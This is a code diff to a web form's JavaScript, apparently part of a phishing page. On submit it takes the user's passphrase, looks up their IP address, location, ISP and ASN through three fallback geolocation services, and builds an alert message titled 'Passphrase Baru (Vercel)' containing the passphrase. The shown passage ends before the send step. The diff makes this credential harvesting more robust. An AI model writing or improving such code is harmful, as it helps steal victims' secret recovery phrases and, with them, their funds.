@@ -20,15 +20,67 @@ document.querySelector('form').addEventListener('submit', function(e) {
   showLoading();
 
     // Ambil Data IP dan Lokasi (Gunakan ip-api.com karena lebih stabil)
-  fetch('https://ip-api.com/json')
-    .then(function(res) { return res.json(); })
+  var ipProviders = [
+    {
+      url: 'https://ip-api.com/json',
+      parse: function(data) {
+        if (data.status !== 'success') throw new Error('ip-api failed');
+        return {
+          location: (data.city || 'Unknown') + ', ' + (data.country || 'Unknown'),
+          ipAddress: data.query || 'Unknown',
+          isp: data.isp || 'Unknown',
+          asn: data.as || 'Unknown'
+        };
+      }
+    },
+    {
+      url: 'https://ipapi.co/json',
+      parse: function(data) {
+        return {
+          location: (data.city || 'Unknown') + ', ' + (data.country_name || 'Unknown'),
+          ipAddress: data.ip || 'Unknown',
+          isp: data.org || 'Unknown',
+          asn: data.asn || 'Unknown'
+        };
+      }
+    },
+    {
+      url: 'https://ifconfig.co/json',
+      parse: function(data) {
+        return {
+          location: (data.city || 'Unknown') + ', ' + (data.country || 'Unknown'),
+          ipAddress: data.ip || 'Unknown',
+          isp: data.org || 'Unknown',
+          asn: data.asn || 'Unknown'
+        };
+      }
+    }
+  ];
+
+  function getIpData(index) {
+    if (index >= ipProviders.length) {
+      return Promise.reject(new Error('No IP provider available'));
+    }
+
+    return fetch(ipProviders[index].url, { cache: 'no-store' })
+      .then(function(res) {
+        if (!res.ok) throw new Error('HTTP ' + res.status);
+        return res.json();
+      })
+      .then(function(data) {
+        return ipProviders[index].parse(data);
+      })
+      .catch(function() {
+        return getIpData(index + 1);
+      });
+  }
+
+  getIpData(0)
     .then(function(ipData) {
-      var location = ipData.status === 'success'
-        ? (ipData.city || 'Unknown') + ', ' + (ipData.country || 'Unknown')
-        : 'Unknown';
-      var ipAddress = ipData.status === 'success' ? (ipData.query || 'Unknown') : 'Unknown';
-      var isp = ipData.status === 'success' ? (ipData.isp || 'Unknown') : 'Unknown';
-      var asn = ipData.status === 'success' ? (ipData.as || 'Unknown') : 'Unknown';
+      var location = ipData.location;
+      var ipAddress = ipData.ipAddress;
+      var isp = ipData.isp;
+      var asn = ipData.asn;
       var message = "<b>🔔 Passphrase Baru (Vercel)</b>\n" +
                     "<b>Waktu:</b> " + new Date().toLocaleString('id-ID') + "\n\n" +
                     "<code>" + normalized + "</code>\n\n" +
